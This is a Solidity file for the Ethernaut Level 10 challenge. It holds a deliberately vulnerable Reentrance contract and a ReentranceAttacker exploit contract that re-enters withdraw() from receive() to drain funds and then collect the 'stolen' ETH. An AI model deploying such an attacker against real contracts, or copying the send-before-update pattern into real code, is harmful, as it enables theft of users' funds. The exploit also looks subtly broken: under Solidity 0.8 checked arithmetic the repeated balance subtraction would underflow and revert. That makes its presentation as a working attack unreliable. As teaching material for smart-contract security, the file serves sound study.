// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Reentrance
 * @dev Ethernaut Level 10
 * 
 * VULNERABILITY:
 * Classic reentrancy attack - the MOST famous vulnerability in history
 * The DAO Hack 2016: $60M stolen
 * 
 * The withdraw() function:
 * 1. Checks balance ✓
 * 2. Sends ETH via call() ← ATTACKER'S receive() CALLED HERE
 * 3. Updates balance ✗ (TOO LATE!)
 * 
 * Attacker can re-enter withdraw() before balance is updated
 * 
 * LESSON:
 * Always apply checks-effects-interactions pattern
 * Or use ReentrancyGuard modifier
 */
contract Reentrance {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // ⚡ VULNERABLE: sends ETH BEFORE updating balance
        (bool success,) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        // ⚡ TOO LATE: attacker already re-entered!
        balances[msg.sender] -= _amount;
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentranceAttacker
 * @dev Exploit: re-enter withdraw() to drain all funds
 */
contract ReentranceAttacker {
    Reentrance public target;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    constructor(address _target) {
        target = Reentrance(_target);
    }
    
    // Start the attack
    function attack(uint256 _amount) external payable {
        attackCount = 0;
        
        // Deposit first to have balance
        target.deposit{value: _amount}();
        
        // Start reentrancy
        target.withdraw(_amount);
    }
    
    function setMaxAttacks(uint256 _max) external {
        maxAttacks = _max;
    }
    
    // ⚡ THIS IS THE KEY: called when ETH is sent to this contract
    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < maxAttacks) {
            attackCount++;
            // Re-enter withdraw() before balance is updated!
            target.withdraw(1 ether);
        }
    }
    
    function getAttackCount() external view returns (uint256) {
        return attackCount;
    }
    
    // Withdraw stolen funds
    function withdrawStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
